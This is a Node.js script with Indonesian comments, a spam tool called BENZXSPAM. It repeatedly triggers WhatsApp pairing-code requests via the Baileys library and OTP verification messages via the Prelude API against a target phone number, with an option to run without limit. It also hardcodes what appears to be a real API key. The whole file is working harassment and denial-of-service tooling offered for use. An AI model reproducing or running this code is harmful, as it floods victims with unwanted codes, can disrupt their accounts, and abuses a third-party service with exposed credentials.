// ===========================================
// BENZXSPAM V2.0 - QUANTUM EDITION 🔥
// Fitur: Pairing Spam + OTP Spam (Prelude)
// Tekan 'q' atau 's' untuk stop spam kapan aja
// ===========================================

const { default: makeWASocket, useMultiFileAuthState, Browsers } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const readline = require('readline');

// Konfigurasi readline
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Untuk keypress listener
const stdin = process.stdin;
stdin.setRawMode(true);
stdin.resume();
stdin.setEncoding('utf8');

// Global variable untuk kontrol spam
let isSpamming = false;

// ===========================================
//  FUNGSI HELPERS
// ===========================================
function question(query) {
    return new Promise(resolve => rl.question(query, resolve));
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function generateOTP(length = 6) {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Setup keypress listener
stdin.on('data', (key) => {
    // Ctrl+C exit
    if (key === '\u0003') {
        console.log('\n[!] Keluar...');
        process.exit();
    }
    // Jika spam berjalan, tombol q atau s akan menghentikan
    if (isSpamming && (key === 'q' || key === 's')) {
        console.log('\n[⏹️] STOP SPAM diterima! Menghentikan...');
        isSpamming = false;
    }
});

// ===========================================
//  SPAM PAIRING CODE (Baileys)
// ===========================================
async function spamPairing(nomorTarget, jumlah, delayMs) {
    console.log(`[🔥] Memulai spam pairing ke ${nomorTarget}`);
    let counter = 0;
    
    while (isSpamming && (jumlah === 0 || counter < jumlah)) {
        counter++;
        try {
            console.log(`[⚡] Attempt ${counter}${jumlah > 0 ? '/' + jumlah : ''}`);
            
            const { state } = await useMultiFileAuthState(`./auth_session_${Date.now()}`);
            
            const sock = makeWASocket({
                auth: state,
                logger: pino({ level: 'silent' }),
                browser: Browsers.windows('Desktop'),
                syncFullHistory: false
            });
            
            const customCode = `BENZX${Math.floor(1000 + Math.random() * 9000)}`;
            const pairingCode = await sock.requestPairingCode(nomorTarget, customCode);
            const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
            
            console.log(`[✅] SUCCESS ${counter}: ${formattedCode}`);
            
            sock.ws.close();
            // Hapus folder auth
            fs.rmSync(`./auth_session_${Date.now()}`, { recursive: true, force: true });
            
        } catch (error) {
            console.log(`[❌] Gagal attempt ${counter}:`, error.message);
        }
        
        if (isSpamming && (jumlah === 0 || counter < jumlah)) {
            console.log(`[⏳] Delay ${delayMs/1000} detik...`);
            await delay(delayMs);
        }
    }
    
    console.log('[✅] SPAM PAIRING SELESAI!');
}

// ===========================================
//  SPAM OTP via PRELUDE API
// ===========================================
async function spamOTPPrelude(nomorTarget, jumlah, delayMs, apiKey) {
    console.log(`[🔌] Memulai spam OTP via Prelude ke ${nomorTarget}`);
    let counter = 0;
    
    while (isSpamming && (jumlah === 0 || counter < jumlah)) {
        counter++;
        try {
            const response = await fetch('https://api.prelude.dev/v2/verification', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${apiKey}`
                },
                body: JSON.stringify({
                    target: {
                        type: 'phone_number',
                        value: nomorTarget.replace('@s.whatsapp.net', '') // Bersihin format
                    }
                })
            });
            
            const result = await response.json();
            if (response.ok) {
                console.log(`[✅] Prelude ${counter}: OTP terkirim (ID: ${result.id})`);
            } else {
                console.log(`[❌] Prelude ${counter}: Gagal - ${result.message || response.status}`);
            }
        } catch (error) {
            console.log(`[❌] Prelude ${counter}: Error - ${error.message}`);
        }
        
        if (isSpamming && (jumlah === 0 || counter < jumlah)) {
            console.log(`[⏳] Delay ${delayMs/1000} detik...`);
            await delay(delayMs);
        }
    }
    
    console.log('[✅] SPAM OTP SELESAI!');
}

// ===========================================
//  MAIN MENU
// ===========================================
async function main() {
    console.log(`
╔══════════════════════════════════╗
║    BENZXSPAM V2.0 - QUANTUM      ║
║    [ MADE FOR QUANTUM_YowisBen ] ║
╚══════════════════════════════════╝
    `);
    
    while (true) {
        console.log('\n=== MENU UTAMA ===');
        console.log('[1] SPAM PAIRING CODE (Baileys)');
        console.log('[2] SPAM OTP via PRELUDE (WA)');
        console.log('[3] SETTINGS');
        console.log('[4] EXIT');
        
        const pilihan = await question('Pilih menu (1/2/3/4): ');
        
        if (pilihan === '1' || pilihan === '2') {
            const nomor = await question('Masukkan nomor target (628xx): ');
            let cleanNomor = nomor.replace(/[^0-9]/g, '');
            if (pilihan === '1') {
                cleanNomor = cleanNomor + '@s.whatsapp.net';
            }
            
            const jumlahInput = await question('Jumlah spam (0 = unlimited): ');
            const jumlah = jumlahInput === '0' ? 0 : parseInt(jumlahInput) || 5;
            
            const delayInput = await question('Delay antar spam (detik) [default 3]: ');
            const delayDetik = parseFloat(delayInput) || 3;
            const delayMs = delayDetik * 1000;
            
            console.log('\n[⚠️] SPAM DIMULAI! Tekan Q atau S kapan saja untuk berhenti.\n');
            isSpamming = true;
            
            if (pilihan === '1') {
                await spamPairing(cleanNomor, jumlah, delayMs);
            } else {
                // PRELUDE API KEY (bisa diganti nanti)
                const preludeKey = 'sk_wE6mz6nXxHX7t1XMChXFmmAQXMLJUIJB';
                await spamOTPPrelude(cleanNomor, jumlah, delayMs, preludeKey);
            }
            
            isSpamming = false;
            
        } else if (pilihan === '3') {
            console.log('\n=== SETTINGS ===');
            console.log('Fitur settings akan datang di update berikutnya.');
            console.log('Sekarang lo bisa langsung edit API key di dalam kode.');
            await question('Tekan Enter untuk kembali...');
            
        } else if (pilihan === '4') {
            console.log('[👋] Dadah Komandan!');
            rl.close();
            process.exit();
        }
    }
}

// Jalanin main
main().catch(err => {
    console.log('[💥] ERROR FATAL:', err);
    rl.close();
});